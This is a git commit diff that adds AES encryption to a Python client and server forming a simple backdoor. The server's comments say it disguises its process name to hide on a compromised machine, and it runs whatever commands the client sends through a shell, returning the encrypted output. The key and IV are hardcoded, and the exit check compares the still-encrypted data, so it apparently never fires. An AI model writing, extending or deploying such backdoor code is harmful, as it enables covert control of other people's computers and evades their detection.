370394b0ec2413e2a6e8c29c4d27ab83e3bdcd42
E <eltonsia@yahoo.com>
2015-10-09 22:35:09 -0700

    Added encryption and decryption

--- client.py
+++ client.py
@@ -1,19 +1,35 @@
 import socket
+import sys
+from Crypto.Cipher import AES
+from Crypto import Random
 
 #Client connects to server
 HOST = "127.0.0.1"
 PORT = 8505
 
+#Encryption and decryption variables and initialization
+secretKey = "Secret key lost."
+saltySpatoon = "How tough areyou"
+crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
+
+#Open socket and connect to server
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT))
 
 while True:
+	#User command input to be sent tot he server
 	command = raw_input('Write your command: ')
-	s.sendall(command)
-
+	#Encrypt the string before sending it to the server
+	encryptedCommand = crypt.encrypt(command)
+	#Send encrypted command to the server
+	s.sendall(encryptedCommand)
+	#Receive the data from the server
 	data = s.recv(10240)
+	#Decrypt the data from the server
+	decryptedData = crypt.decrypt(data)
 
-	if data == "quit":
-		break
+	#Print the output
+	if data == "exit":
+		sys.exit()
 	else:
-		print data
+		print decryptedData
--- server.py
+++ server.py
@@ -2,34 +2,45 @@ import sys
 import socket
 import subprocess
 import setproctitle
+from Crypto.Cipher import AES
+from Crypto import Random
+
 #Change process name so that we can hide this program on a compromised machine
 #Make it look like a legitimate process running in the background
 #Usually we want to use something like kworker/2:1 to mask the program
 title = "Backdoor"
 setproctitle.setproctitle(title)
 
-HOST ="127.0.0.1"
-PORT =8505
+#Server connections
+HOST = "127.0.0.1"
+PORT = 8505
 
+#Opening socket and listening on that socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-#s = setsockopt(socket,SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind((HOST, PORT))
 s.listen(1)
+#Accept connections
 conn, addr = s.accept()
 
-print "Connected with " + addr[0] + ':' + str(addr[1])
+#Encryption and decryption variables and initialization
+secretKey = "Secret key lost."
+saltySpatoon = "How tough areyou"
+crypt = AES.new(secretKey, AES.MODE_CFB, saltySpatoon)
 
 while True:
+	#Receive the data from the client
 	data = conn.recv(10240)
-	#if we receive quit, we send quit back to client first then exit the program
-	if data == "quit":
+	#Decrypt the data
+	decryptedData = crypt.decrypt(data)
+	#if we receive exit, we send quit back to client first then exit the program
+	if data == "exit":
 		conn.send(data)
 		sys.exit()
 	else:
-		command = data
-		process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
+		#Run the command using a child process so that it is hidden
+		process = subprocess.Popen(decryptedData, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+		#Store the output of the command into output variable
 		output = process.stdout.read() + process.stderr.read()
-
-		reply = output
-		conn.sendall(reply)
+		#Encrypt the data and send it back to the client
+		encryptedReply = crypt.encrypt(output)
+		conn.sendall(encryptedReply)
